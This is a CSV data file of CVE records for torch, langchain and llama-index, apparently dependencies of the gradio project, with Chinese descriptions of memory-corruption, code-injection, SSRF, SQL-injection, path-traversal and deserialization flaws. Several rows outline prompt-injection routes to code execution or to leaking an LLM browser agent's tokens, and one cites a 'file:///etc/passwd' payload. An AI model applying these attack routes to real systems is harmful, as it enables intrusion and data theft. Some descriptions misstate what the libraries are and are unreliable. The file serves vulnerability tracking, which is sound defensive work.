gradio-app_gradio,torch,>=2.3.1,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,>=2.3.1,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,>=2.3.1,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,>=2.3.1,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,>=2.3.1,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,langchain,,True,CVE-2023-34540,CWE-94,2023-06-14,"LangChain是通过可组合性使用 LLM 构建应用程序。
Langchain 0.0.171版本存在安全漏洞，该漏洞源于存在任意代码执行漏洞。",1,2
gradio-app_gradio,langchain,,True,CVE-2023-29374,CWE-74,2023-04-05,<p>LangChain是通过可组合性使用 LLM 构建应用程序。 LangChain 0.0.131及之前版本存在安全漏洞，该漏洞源于允许快速注入攻击，攻击者利用该漏洞可以执行任意代码。</p>,1,2
gradio-app_gradio,langchain,,True,CVE-2023-34541,CWE-100001,2023-06-20,<p>LangChain是通过可组合性使用 LLM 构建应用程序。 Langchain 0.0.171版本存在安全漏洞，该漏洞源于存在任意代码执行漏洞。</p>,1,2
gradio-app_gradio,langchain,,True,CVE-2023-44467,CWE-78,2023-10-09,<p>LangChain是通过可组合性使用 LLM 构建应用程序。 LangChain langchain_experimental 0.0.14版本存在安全漏洞，该漏洞源于允许攻击者绕过 CVE-2023-36258 修复，并通过 python exec 方法中的 PALChain 执行任意代码。</p>,1,2
gradio-app_gradio,langchain,,True,CVE-2023-32786,CWE-74,2023-10-20,"LangChain是通过可组合性使用 LLM 构建应用程序。
Langchain 0.0.155及之前版本存在安全漏洞，该漏洞源于存在服务器请求伪造（SSRF）漏洞。",2,2
gradio-app_gradio,langchain,,True,CVE-2023-32785,,,LangChain 是一个用于通过可组合性使用 LLM 构建应用程序的 Python 库。该库提供了多种功能模块，例如与数据库交互的功能模块 `db_chain()`，可以帮助开发者构建复杂的自然语言处理和数据管理应用程序。在版本 0.0.247 之前，LangChain 存在 SQL 注入漏洞。漏洞的根本原因是 `db_chain()` 对用户输入的参数缺乏严格的校验。攻击者可以通过构造恶意的 SQL 查询，绕过正常的查询逻辑并执行任意的 SQL 指令。这种漏洞利用了组件在用户输入与数据库查询之间缺乏信任边界的设计缺陷。攻击者可通过该漏洞直接访问或篡改数据库中的敏感数据，甚至对数据库进行破坏。,3,2
gradio-app_gradio,langchain,,True,CVE-2023-46229,CWE-918,2023-10-19,"LangChain是通过可组合性使用 LLM 构建应用程序。
LangChain 0.0.317 版本之前存在安全漏洞，该漏洞源于通过 document_loaders/recursive_url_loader.py 可以进行服务器端请求伪造攻击，因为爬取可以从外部服务器进行到内部服务器。",2,0
gradio-app_gradio,langchain,,True,CVE-2023-39659,CWE-74,2023-08-15,"LangChain是通过可组合性使用 LLM 构建应用程序。
LangChain v.0.0.232 版本存在安全漏洞，该漏洞源于通过 PythonAstREPLTool._run 组件可以执行任意代码。",1,2
gradio-app_gradio,langchain,,True,CVE-2023-39631,CWE-94,2023-09-01,<p>LangChain是通过可组合性使用 LLM 构建应用程序。 Langchain v.0.0.245版本存在安全漏洞，该漏洞源于允许远程攻击者通过numexpr库中的评估函数执行任意代码。</p>,1,2
gradio-app_gradio,langchain,,True,CVE-2023-36281,CWE-94,2023-08-22,"LangChain是通过可组合性使用 LLM 构建应用程序。
LangChain v.0.0.171版本存在代码注入漏洞，该漏洞源于允许远程攻击者通过 json 文件及 load_prompt 参数执行任意代码。",1,1
gradio-app_gradio,langchain,,True,CVE-2023-38896,CWE-74,2023-08-15,<p>LangChain是通过可组合性使用 LLM 构建应用程序。 langchain 0.0.194 版本及之前版本存在安全漏洞，该漏洞源于通过 from_math_prompt 和 from_colored_object_prompt 函数可以执行任意代码。</p>,1,2
gradio-app_gradio,langchain,,True,CVE-2023-38860,CWE-94,2023-08-15,"LangChain是通过可组合性使用 LLM 构建应用程序。
LangChain v.0.0.231版本存在安全漏洞，该漏洞源于允许远程攻击者通过提示参数执行任意代码。",1,2
gradio-app_gradio,langchain,,True,CVE-2023-36095,CWE-94,2023-08-05,<p>LangChain是通过可组合性使用 LLM 构建应用程序。 Harrison Chase langchain v.0.0.194版本存在代码注入漏洞，该漏洞源于from_math_prompt(llm).run存在任意代码执行漏洞。</p>,1,2
gradio-app_gradio,langchain,,True,CVE-2023-36258,CWE-94,2023-07-03,"LangChain是通过可组合性使用 LLM 构建应用程序。
LangChain v.0.0.199版本存在安全漏洞，该漏洞源于允许攻击者通过 python exec 方法中的 PALChain 执行任意代码。",1,2
gradio-app_gradio,langchain,,True,CVE-2023-36188,CWE-74,2023-07-06,"LangChain是通过可组合性使用 LLM 构建应用程序。
LangChain v.0.0.64版本存在安全漏洞，该漏洞源于允许攻击者通过Python exec方法中的PALChain参数执行任意代码。",1,2
gradio-app_gradio,langchain,,True,CVE-2023-36189,CWE-89,2023-07-06,"LangChain是通过可组合性使用 LLM 构建应用程序。
LangChain v.0.0.64版本存在SQL注入漏洞，该漏洞源于存在SQL注入漏洞，允许远击者通过SQLDatabaseChain组件获取敏感信息。",2,2
gradio-app_gradio,langchain,,True,CVE-2024-28088,CWE-22 CWE-31,,<p>LangChain 是一个用于通过可组合性构建应用程序的开源库，允许开发者在构建语言模型（LLM）的应用时轻松处理不同配置。当调用 `load_chain` 函数时，由于用户输入的路径参数未进行适当验证，导致存在路径遍历的漏洞。攻击者可以通过操控路径参数来遍历目录，加载不应被应用加载的配置或执行代码。这种攻击只在攻击者能够控制路径参数的最后部分时可被触发。使用示例代码可以利用该漏洞进行远程代码执行或泄露敏感信息。</p>,2,1
gradio-app_gradio,langchain,,True,CVE-2024-3571,CWE-22,,<p>LangChain 是一个用于构建应用程序的工具，利用大型语言模型（LLMs）进行可组合性开发。该组件的 `LocalFileStore` 功能由于对文件路径的限制不够严格，存在路径遍历漏洞。攻击者可以利用此漏洞在文件系统中的任意位置读取或写入文件，从而导致信息泄露或远程代码执行。漏洞根源在于 `mset` 和 `mget` 方法中用户输入未经过妥善清理，允许目录遍历序列到达意外目录。</p>,3,1
gradio-app_gradio,langchain,,True,CVE-2024-3095,CWE-918,,<p>LangChain 是一个通过可组合性构建应用程序的框架。该框架中的 Web Research Retriever 组件存在服务器端请求伪造 (SSRF) 漏洞。该漏洞发生的根本原因是该组件未对请求进行适当限制，允许其访问本地地址。攻击者利用该漏洞可以进行端口扫描、访问本地服务，并在云环境中读取实例元数据。尽管只允许通过 GET 请求进行攻击，但仍可能会影响机密性、完整性和可用性。</p>,3,1
gradio-app_gradio,langchain,,True,CVE-2024-5998,CWE-502,,<p>LangChain 是一个开源的 Python 库，旨在通过组合性构建基于大语言模型的应用程序。在其 FAISS.deserialize_from_bytes 函数中，存在不信任数据的 pickle 反序列化漏洞。此漏洞的根源在于未能充分验证反序列化后的数据有效性，攻击者可以通过操控输入数据来执行任意命令，利用 os.system 函数。利用此漏洞，攻击者只需向应用程序发送恶意构造的序列化数据即可触发该漏洞。</p>,3,1
gradio-app_gradio,langchain,,True,CVE-2024-8309,CWE-89 CWE-74,,<p>LangChain 是一个开源框架，用于开发由大型语言模型（LLM）支持的应用程序。版本 0.2.5 存在 SQL 注入漏洞，此漏洞源于 GraphCypherQAChain 类的不充分输入验证，攻击者可以通过提示注入恶意 SQL 命令来操纵、删除或创建数据。这可能导致未经授权的数据操纵、服务中断、数据泄露、多租户环境的安全漏洞和数据完整性问题。</p>,4,1
gradio-app_gradio,langchain,,True,,,,<p>LangChain 是一个用于构建自然语言处理应用的 Python 库。版本 0.0.353 的 langchain_experimental 允许攻击者绕过 AST 验证中的检查，通过 Python exec 方法执行任意代码。此漏洞发生在通过 PALChain 调用代码时，通过不当处理的验证逻辑，攻击者能够注入恶意代码并造成远程代码执行。</p>,1,1
gradio-app_gradio,langchain,,True,,,,<p>Langchain 是一个用于处理区块链数据的 Python 库。该库的 Blockchain Document Loader 模块存在一个服务器端请求伪造漏洞，攻击者可以利用此漏洞向内部 HTTP(s) 服务器发送未经授权的请求，从而访问敏感数据或中断服务。该漏洞的根本原因在于代码中的用户输入未经过正确验证，允许攻击者注入任意 URL。具体来说，攻击者可以构造一个恶意的请求，通过 langchain 库中的 load() 函数触发，这可能导致数据泄露、服务中断甚至远程代码执行。</p>,2,1
gradio-app_gradio,langchain,,True,,,,<p>langchain_community是一个基于Python的开源库，旨在简化图形数据库与机器学习的集成。此漏洞存在于Neo4jVector类中，导致对用户输入的清理不足，允许攻击者通过node_label或embedding_node_property进行Cypher注入。攻击者可以通过不安全的用户输入创建、修改或删除数据库中的节点。</p>,1,1
gradio-app_gradio,langchain,,True,,,,<p>Langchain 是一个用于构建语言模型应用程序的Python库。该漏洞影响到用 Playwright 浏览器工具包创建的 LLM 浏览器 AI 代理，当目标网站中包含 visibility:hidden 的元素时，外部攻击者可以通过恶意提示获取这些元素的值。这些元素可能包含用于安全目的的令牌，如 CSRF 令牌，此外在 OAuth 2.0 response_mode=form_post 中，包含了用于身份验证和授权的 ID 令牌和访问令牌。这一漏洞的根本原因在于在处理隐藏字段时缺乏严格的安全机制，从而导致通过被注入的恶意代码泄露重要的安全令牌。</p>,3,1
gradio-app_gradio,langchain,,True,,,,<p>Langchain是一个用于处理文档的Python库，通过多个数据源加载器提取信息。当开发者将这些加载器的参数暴露给不可信的来源时，可能会导致XXE漏洞的出现。此漏洞的根本原因在于对外部实体的处理不当，攻击者可以通过构造恶意XML文件，利用XXE漏洞读取服务器上的敏感文件，如配置文件、源代码文件和数据备份等。此外，攻击者还可以利用该漏洞强制应用程序向内部或外部服务发送请求，可能对其他内部系统构成安全威胁。</p>,1,1
gradio-app_gradio,langchain,,True,,,,<p>TiDBChatMessageHistory 类是 langchain 库的一部分，该类用于管理聊天消息的历史记录并从数据库加载消息。该漏洞源于对 parameters 参数 (earliest_time) 的类型未进行验证，攻击者可以通过构造恶意输入来控制数据库查询。具体而言，攻击者可以在 _load_messages_to_cache 方法中传入恶意的 earliest_time 值，从而执行任意 SQL 查询。这使得攻击者能够窃取数据库内容。</p>,3,1
gradio-app_gradio,langchain,,True,,,,<p>Langchain 是一个用于构建 AI 应用程序的框架，TFIDFRetriever 是该框架中的一个类，用于处理文本检索。然而，该类中的 load_local() 方法在加载向量化器和文档时，使用了 untrusted pickle 文件的 deserialize，而没有进行相应的内容验证，导致可能执行恶意的 Python 代码。攻击者可以通过构造恶意的 pickle 文件，在应用程序加载该文件时执行任意命令，造成严重的安全问题。</p>,1,1
gradio-app_gradio,langchain,,True,,,,<p>MRKLOutputParser 是 Langchain 库中的一个输出解析器，负责解析输入文本并确定相应的操作。然而，该组件的 'parse' 函数未能有效处理输入文本中的正则表达式，当文本中包含恶意输入时，可能导致拒绝服务（ReDoS）攻击。由于正则表达式的执行时间与输入大小呈指数关系，恶意输入可能导致解析时间显著增加，进而使服务器变得不可用。</p>,3,1
gradio-app_gradio,langchain,,True,,,,<p>Langchain 是一个开源的 Python 库，用于构建大语言模型(LLM)应用程序。此漏洞出现在通过 `create_sql_agent` 实现的数据分析功能中，攻击者可以发送特制的查询来读取和写入文件，进而可能导致远程代码执行(RCE)。具体来说，通过构造特定的 SQL 查询，攻击者可以利用 PostgreSQL 的功能，将恶意代码写入文件或读取敏感信息。</p>,1,1
gradio-app_gradio,langchain,,True,,,,<p>Langchain 是一个用于简化文档加载和处理的 Python 库，具有灵活性和可扩展性。该漏洞允许攻击者使用 'file://' URL 方案从服务器读取任意文件的内容，进而导致敏感信息泄露。具体来说，漏洞源于 PlaywrightWebBaseLoader 组件未能正确限制用户输入，攻击者能够触发页面内容加载任意文件。通过构造特定的请求，攻击者可以下载配置文件、环境变量等敏感信息。</p>,3,1
gradio-app_gradio,langchain,,True,,,,<p>BibtexLoader 是 Langchain 社区的一个组件，旨在从 bib 文件中提取引用的文献并加载相关的 PDF 文件。该漏洞是由文件名未经过验证引起的，允许攻击者读取位于 bib 文件目录以外的任意 PDF 文件。例如，攻击者可以通过构造特定的 bibtex 条目来访问上层目录中的 '1.pdf' 文件，从而导致未授权的数据访问。</p>,3,1
gradio-app_gradio,langchain,,True,,,,<p>Langchain 是一个基于 Python 的数据处理库，用于构建数据处理管道。该库中的 split_text_from_url 方法存在服务器端请求伪造漏洞，攻击者可以利用这一方法来访问敏感的服务器文件或执行恶意代码。攻击者只需提供特制的 URL，例如通过路径遍历载荷（如 file:///etc/passwd）或恶意的 data URI，即可绕过安全限制，从而导致对机密文件的未授权访问或通过注入的转换实现服务器的破坏。</p>,1,1
gradio-app_gradio,llama-index,,True,CVE-2024-4181,CWE-94,,LlamaIndex 是由个人开发者 Jerry Liu 创建的一个 LLM 应用程序的数据框架。该框架的 0.9.47 版本存在代码注入漏洞，漏洞源于 eval 函数的不当使用，允许恶意或受损的 LLM 托管提供商在客户端的计算机上执行任意命令。攻击者可以利用此漏洞实现命令注入，危害应用程序的安全性。,2,1
gradio-app_gradio,llama-index,,True,CVE-2023-39662,CWE-74,2023-08-15,"LlamaIndex是Jerry Liu个人开发者的一个 LLM 应用程序的数据框架。
LlamaIndex v.0.7.13 版本存在安全漏洞，该漏洞源于通过 PandasQueryEngine 函数中的 exec 参数可以执行任意代码。",1,2
gradio-app_gradio,llama-index,,True,CVE-2024-23751,CWE-89,2024-01-22,LlamaIndex 是一个用于处理结构化和非结构化数据的查询引擎集合。其功能允许用户通过自然语言输入生成SQL查询。然而在0.9.34版本及之前，LlamaIndex 的 NLSQLTableQueryEngine、SQLTableRetrieverQueryEngine、NLSQLRetriever、RetrieverQueryEngine 和 PGVectorSQLQueryEngine 中的 Text-to-SQL 功能存在安全漏洞。攻击者可以通过构造特定英文输入，如“Drop the Students table”，可能导致不当的SQL语句被执行。,1,0
gradio-app_gradio,llama-index,,True,CVE-2025-6211,CWE-440,2025-07-10,"LlamaIndex是LlamaIndex开源的一个 LLM 应用程序的数据框架。
LlamaIndex 0.12.28及之前版本存在安全漏洞，该漏洞源于使用MD5哈希生成文档块ID，可能导致哈希冲突。",3,2
gradio-app_gradio,llama-index,,True,CVE-2025-6209,CWE-29,2025-07-07,<p>run-llama/llama_index 是一个用于处理图像和数据索引的库。该漏洞发生在 0.12.27 至 0.12.40 版本中，位于 `generic_utils.py` 文件中的 `encode_image` 函数。攻击者可以操控 `image_path` 输入以读取服务器上的任意文件，包括敏感的系统文件。漏洞成因是路径验证或清理不当，允许路径遍历序列访问超出预期目录的文件。此漏洞在 0.12.41 版本中已修复。</p>,1,2
gradio-app_gradio,llama-index,,True,CVE-2024-12911,CWE-89,,llama_index 是一个基于 Python 的开源库，旨在提供强大的查询引擎功能。该库中的 `default_jsonalyzer` 函数存在 SQL 注入漏洞，攻击者可以通过巧妙构造的提示注入 SQL 代码，从而引发任意文件创建和拒绝服务（DoS）攻击。该漏洞在最新版本中被发现，并在 0.5.1 版本中进行了修复。,2,1
gradio-app_gradio,llama-index,,True,CVE-2024-12910,CWE-674,2025-03-20,run-llama/llama_index 是一个用于管理知识库索引的开源库，主要用于处理和获取文章信息。该漏洞出现在 `KnowledgeBaseWebReader` 类中，攻击者可以通过控制一个 URL 变量使其包含根 URL。这导致 `get_article_urls` 方法进行无限递归调用，从而耗尽系统资源，可能导致应用程序崩溃。,3,1
gradio-app_gradio,llama-index,,True,CVE-2024-12704,CWE-835,2025-03-20,run-llama/llama_index是一个基于LangChain的库，版本v0.12.5中存在拒绝服务漏洞。该库的stream_complete方法使用线程执行llm，并通过StreamingGeneratorCallbackHandler类的get_response_gen方法获取结果。如果线程在执行_llm.predict之前异常终止，没有针对这种情况的异常处理，导致get_response_gen函数进入无限循环。这种情况可以通过提供不正确类型的输入来触发，从而导致线程终止，进程将持续无限运行。,2,2
gradio-app_gradio,llama-index,,True,CVE-2025-1793,CWE-89,2025-06-05,run-llama/llama_index 是一个用于构建向量存储的库，支持多种集成。在版本 v0.12.21 中，该库的多个向量存储集成存在 SQL 注入漏洞。这些漏洞的根本原因是缺乏对用户输入的校验。攻击者可以通过构造恶意的 SQL 查询来执行未授权的数据库操作，导致数据的读取和写入。,1,2
gradio-app_gradio,llama-index,,True,,,,<p>Llama Index 是一个用于构建和管理索引的 Python 库，允许用户加载和操作数据模型。该库中的 BGEM3Index 类的 load_from_disk 函数使用了 pickle.load()，存在反序列化漏洞。攻击者可以上传一个包含恶意 payload 的文件夹（例如带有 __reduce__ 方法的类），导致在目标主机上执行任意代码。利用这个漏洞，攻击者可以通过构造特定格式的文件来触发该代码执行。</p>,2,1
gradio-app_gradio,llama-index,,True,,,,<p>Llama-index-core是一个用于处理文本和对象索引的Python库，旨在促进对数据索引和嵌入的高效管理。此库内的SimpleObjectNodeMapping类中的from_persist_dir()方法存在反序列化不信任数据的漏洞，攻击者可以通过上传恶意的pickle文件触发反向Shell。此漏洞的根本原因是使用pickle.load()加载恶意序列化的数据时，可能会自动执行其中定义的__reduce__方法，从而允许攻击者通过恶意构造的数据执行任意代码。</p>,2,1
gradio-app_gradio,llama-index,,True,,,,<p>VannaQueryEngine 是 Vanna AI LlamaPack 中的一个组件，允许用户使用 SQL 数据库提出问题。它根据用户的提示生成并执行 SQL 查询。然而，由于在 `run_sql` 函数中缺乏保护措施，该组件易受 SQL 注入攻击。攻击者能够通过恶意输入实现 SQL 注入，从而可能引发拒绝服务 (DoS) 漏洞，利用可递归的 SQL 查询造成系统可用性危机。</p>,2,1
gradio-app_gradio,llama-index,,True,,,,<p>llama_index 是一个用于简化 Python 中信息检索和处理的库，主要用于集成和下载模块。当在 llama_index.core.download.integration 中使用 exec 函数动态导入类时，存在安全漏洞，攻击者可以通过修改传入的 cls_name 参数来插入恶意代码，执行任意命令。具体来说，该代码在导入模块时不当使用 exec 函数，导致执行环境受到恶意代码的控制，如果被攻击者利用，将会在主机系统上以运行该代码的进程权限执行任意命令。</p>,1,1
gradio-app_gradio,llama-index,,True,,,,<p>llama_index 是一个用于数据处理和分析的 Python 库，提供了可以灵活查询数据的功能。目前最新版本 v0.10.25 存在一个由于 prompt 注入引起的远程代码执行漏洞。该漏洞源于库在执行代码时使用了 safe_eval 函数，虽然该函数包含了许多安全检查，但因为导入了 pandas 库而导致风险。pandas 导入时会加载多种模块，包括 sys、os 和 subprocess，这些模块可以被利用来执行系统命令。攻击者可以构造恶意查询，使得系统命令得以执行。</p>,1,1
gradio-app_gradio,llama-index,,True,,,,<p>Cogniswitch 查询引擎是一个用于与 Cogniswitch 服务器交互的 Python 类，旨在发送查询请求并接收响应。然而，该类在请求 Cogniswitch 服务器时未进行 SSL 验证，这使得本地网络中的攻击者能够拦截连接。攻击者可以通过发送请求截取数据，导致机密信息（如 API 密钥）泄露。该漏洞的根本原因是在使用 requests 库时未将 verify 参数设为 True，从而导致敏感数据在未加密的情况下传输。具体来说，发送的数据包含高度机密的信息，例如 API 密钥、平台令牌和 OpenAI 令牌。此外，Jsv证书验证缺失可能导致数据在传输过程中被篡改，影响数据的完整性。</p>,3,1
gradio-app_gradio,llama-index,,True,,,,<p>llama_index 是一个用于构建和查询数据的开源 Python 库，旨在利用 pandas 提供高效的数据处理和分析功能。该漏洞的根本原因在于不当的代码生成控制，当调用 safe_exec 方法时，攻击者可以通过特定的输入触发远程代码执行。在这次漏洞中，攻击者可以构造恶意查询，从而调用 exec() 函数，执行任意代码，例如操作系统命令。</p>,1,1
gradio-app_gradio,llama-index,,True,,,,<p>Llama Index 是一个用于构建大型语言模型（LLM）应用程序的 Python 库，旨在简化 LLM 的数据访问与管理。此漏洞源于 download_llama_pack 函数的设计缺陷，该函数允许从不受信任的 URL 下载软件包而不进行内容完整性检查。攻击者可以构造恶意的 Llama Pack，通过特定的 URL 下载并执行代码，导致远程代码执行 (RCE)。例如，在下载的 Python 包中可能包含反向 shell 的代码，攻击者可以利用这一点来执行任意命令。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
